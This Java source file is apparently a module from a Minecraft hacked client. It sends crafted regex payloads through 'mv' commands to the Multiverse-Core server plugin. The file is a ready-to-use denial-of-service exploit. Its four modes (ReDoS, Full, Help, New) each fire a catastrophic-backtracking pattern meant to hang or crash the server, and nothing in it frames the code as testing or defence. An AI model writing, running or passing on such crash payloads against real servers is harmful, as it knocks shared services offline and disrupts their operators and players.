// Enhanced with methods from HackVogel/meteor-crash-addon (MIT License)
package thunder.hack.features.modules.crash;

import thunder.hack.features.modules.Module;
import thunder.hack.setting.Setting;

public class MultiverseCrash extends Module {
    private final Setting<Mode> mode = new Setting<>("Mode", Mode.ReDoS);
    private boolean sent = false;

    public MultiverseCrash() {
        super("MultiverseCrash", Category.CRASH);
    }

    @Override
    public void onEnable() {
        sent = false;
    }

    @Override
    public void onUpdate() {
        if (mc.player == null || sent) return;
        sent = true;

        switch (mode.getValue()) {
            case ReDoS -> {
                mc.player.networkHandler.sendCommand("mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
                mc.player.networkHandler.sendCommand("mv help ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
            }
            case Full -> mc.player.networkHandler.sendCommand("/MultiVerseCore:mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
            case Help -> mc.player.networkHandler.sendCommand("mVhElP <*.*.*.*.*.*.*.>");
            case New -> mc.player.networkHandler.sendCommand("mvh .*{9999}.*{9999}.*{9999}.*{9999}.$%");
        }
        sendMessage("Multiverse crash sent");
        disable();
    }

    @Override
    public void onDisable() {
        sent = false;
    }

    public enum Mode {
        ReDoS, Full, Help, New
    }
}
